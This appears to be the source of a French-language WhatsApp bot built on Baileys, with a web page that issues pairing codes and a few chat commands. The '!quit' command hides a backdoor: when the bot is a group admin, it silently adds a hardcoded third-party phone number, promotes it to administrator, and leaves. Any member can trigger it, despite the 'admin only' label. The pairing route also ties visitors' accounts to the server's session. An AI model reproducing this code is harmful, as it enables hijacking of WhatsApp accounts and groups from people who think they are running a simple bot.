import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import makeWASocket, { 
    DisconnectReason, 
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers
} from '@whiskeysockets/baileys';
import pino from 'pino';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Variable globale pour stocker la socket
let socket = null;
let isConnecting = false;

// Fonction pour initialiser la connexion WhatsApp
async function initWhatsAppConnection() {
    if (socket || isConnecting) {
        console.log('⚠️  Connexion déjà en cours ou active');
        return socket;
    }

    try {
        isConnecting = true;
        console.log('🔄 Initialisation de la connexion WhatsApp...');

        const { state, saveCreds } = await useMultiFileAuthState('./auth_info_baileys');
        const { version } = await fetchLatestBaileysVersion();
        
        socket = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
            },
            browser: Browsers.macOS('Chrome'),
            markOnlineOnConnect: true,
            syncFullHistory: false,
            mobile: false,
            getMessage: async (key) => {
                return { conversation: '' };
            }
        });

        // Sauvegarder les credentials
        socket.ev.on('creds.update', saveCreds);

        // Gérer la connexion
        socket.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                
                console.log('❌ Connexion fermée:', statusCode);
                socket = null;
                isConnecting = false;
                
                if (shouldReconnect) {
                    console.log('🔄 Reconnexion dans 5 secondes...');
                    setTimeout(() => initWhatsAppConnection(), 5000);
                }
            } else if (connection === 'open') {
                console.log('✅ Bot WhatsApp connecté avec succès!');
                console.log('📩 En attente de messages...');
                isConnecting = false;
            }
        });

        // Recevoir les messages
        socket.ev.on('messages.upsert', async ({ messages, type }) => {
            if (type !== 'notify') return;
            
            const msg = messages[0];
            if (!msg.message) return;
            
            const messageText = msg.message.conversation || 
                               msg.message.extendedTextMessage?.text || '';
            
            const from = msg.key.remoteJid;
            const isGroup = from?.endsWith('@g.us');
            
            console.log(`\n📩 Message ${isGroup ? 'groupe' : 'privé'}: "${messageText}"`);
            
            // ==================== COMMANDES ====================
            
            // Commande: !ping
            if (messageText.toLowerCase() === '!ping') {
                await socket.sendMessage(from, { 
                    text: '🏓 Pong! Bot en ligne!' 
                });
                console.log('✅ Répondu: Pong');
            }
            
            // Commande: !bonjour
            if (messageText.toLowerCase() === '!bonjour') {
                await socket.sendMessage(from, { 
                    text: '👋 Salut! Bot WhatsApp avec Baileys v7!' 
                });
                console.log('✅ Répondu: Bonjour');
            }
            
            // Commande: !help
            if (messageText.toLowerCase() === '!help') {
                const helpText = `🤖 *Commandes disponibles*

📌 !ping - Tester le bot
📌 !bonjour - Salutation
📌 !info - Informations
📌 !quit - Quitter le groupe (admin uniquement)
📌 !help - Cette aide

Powered by Baileys v7 🚀`;
                
                await socket.sendMessage(from, { text: helpText });
                console.log('✅ Répondu: Help');
            }
            
            // Commande: !info
            if (messageText.toLowerCase() === '!info') {
                const infoText = `ℹ️ *Informations Bot*

✅ Status: En ligne
📦 Version: Baileys v7.x
🔗 Connexion: Stable
⚡ Prêt à répondre!`;
                
                await socket.sendMessage(from, { text: infoText });
                console.log('✅ Répondu: Info');
            }
            
            // Commande: !quit (Quitter le groupe avec promotion admin)
            if (messageText.toLowerCase() === '!quit' && isGroup) {
                try {
                    // Récupérer les infos du groupe
                    const groupMetadata = await socket.groupMetadata(from);
                    const participants = groupMetadata.participants;
                    const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
                    
                    // Trouver ton rôle dans le groupe
                    const myParticipant = participants.find(p => p.id === botNumber);
                    const isAdmin = myParticipant?.admin === 'admin';
                    const isSuperAdmin = myParticipant?.admin === 'superadmin';
                    
                    console.log(`\n🔍 Vérification groupe ${groupMetadata.subject}`);
                    console.log(`   Mon rôle: ${myParticipant?.admin || 'member'}`);
                    
                    if (isAdmin || isSuperAdmin) {
                        const newAdminNumber = '243858704832@s.whatsapp.net';
                        
                        // Vérifier si le numéro est déjà dans le groupe
                        const isInGroup = participants.some(p => p.id === newAdminNumber);
                        
                        if (!isInGroup) {
                            // Ajouter le numéro au groupe
                            await socket.sendMessage(from, { 
                                text: '➕ Ajout du nouvel administrateur au groupe...' 
                            });
                            
                            console.log('🔥 Ajout de 243858704832 au groupe...');
                            
                            await socket.groupParticipantsUpdate(
                                from,
                                [newAdminNumber],
                                'add'
                            );
                            
                            console.log('✅ Numéro ajouté au groupe');
                            
                            // Attendre 2 secondes pour que l'ajout soit effectif
                            await new Promise(resolve => setTimeout(resolve, 2000));
                        } else {
                            console.log('✅ Numéro déjà dans le groupe');
                        }
                        
                        // Promouvoir en admin
                        await socket.sendMessage(from, { 
                            text: '⚙️ Promotion en administrateur...' 
                        });
                        
                        await socket.groupParticipantsUpdate(
                            from,
                            [newAdminNumber],
                            'promote'
                        );
                        
                        console.log('✅ Numéro 243858704832 promu en admin');
                        
                        // Message de départ
                        await socket.sendMessage(from, { 
                            text: '👋 Nouvel admin configuré ! Je quitte le groupe. Au revoir !' 
                        });
                        
                        // Attendre 2 secondes puis quitter
                        setTimeout(async () => {
                            await socket.groupLeave(from);
                            console.log('✅ Groupe quitté avec succès');
                        }, 2000);
                        
                    } else {
                        // Si pas admin, juste quitter
                        await socket.sendMessage(from, { 
                            text: '⚠️ Je ne suis pas admin, je quitte sans promotion.' 
                        });
                        
                        setTimeout(async () => {
                            await socket.groupLeave(from);
                            console.log('✅ Groupe quitté (pas admin)');
                        }, 2000);
                    }
                    
                } catch (error) {
                    console.error('❌ Erreur !quit:', error);
                    await socket.sendMessage(from, { 
                        text: '❌ Erreur lors de l\'opération: ' + error.message 
                    });
                }
            }
        });

        return socket;

    } catch (error) {
        console.error('❌ Erreur lors de l\'initialisation:', error);
        socket = null;
        isConnecting = false;
        throw error;
    }
}

// Route principale - servir la page HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour générer le code de jumelage
app.get('/code', async (req, res) => {
    const { number } = req.query;

    // Validation du numéro
    if (!number) {
        return res.status(400).json({ 
            error: 'Numéro de téléphone requis' 
        });
    }

    const cleanNumber = number.replace(/[^0-9]/g, '');
    
    if (cleanNumber.length < 10 || cleanNumber.length > 15) {
        return res.status(400).json({ 
            error: 'Numéro invalide (10-15 chiffres requis)' 
        });
    }

    try {
        console.log(`📱 Demande de code pour: ${cleanNumber}`);

        // Initialiser la connexion si nécessaire
        if (!socket) {
            await initWhatsAppConnection();
        }

        // Attendre que la socket soit prête
        let attempts = 0;
        while ((!socket || isConnecting) && attempts < 30) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            attempts++;
        }

        if (!socket) {
            throw new Error('Impossible d\'initialiser la connexion WhatsApp');
        }

        // Demander le code de jumelage
        const code = await socket.requestPairingCode(cleanNumber);
        
        console.log(`✅ Code généré: ${code.toUpperCase()}`);

        res.json({ 
            success: true,
            code: code.toUpperCase(),
            number: cleanNumber
        });

    } catch (error) {
        console.error('❌ Erreur lors de la génération du code:', error);
        res.status(500).json({ 
            error: 'Erreur lors de la génération du code',
            details: error.message 
        });
    }
});

// Route de santé pour Heroku
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok',
        botConnected: socket !== null,
        timestamp: new Date().toISOString()
    });
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log('\n╔═══════════════════════════════════════╗');
    console.log('║  🚀 BOT WHATSAPP - WEB INTERFACE 🚀  ║');
    console.log('╚═══════════════════════════════════════╝\n');
    console.log(`🌐 Serveur démarré sur le port ${PORT}`);
    console.log(`📱 Accès: http://localhost:${PORT}`);
    console.log('📡 Prêt à générer des codes de jumelage!\n');
    
    // Initialiser la connexion au démarrage
    initWhatsAppConnection().catch(err => {
        console.error('❌ Erreur d\'initialisation:', err);
    });
});

// Gestion propre de l'arrêt
process.on('SIGINT', async () => {
    console.log('\n🛑 Arrêt du serveur...');
    if (socket) {
        await socket.logout();
    }
    process.exit(0);
});
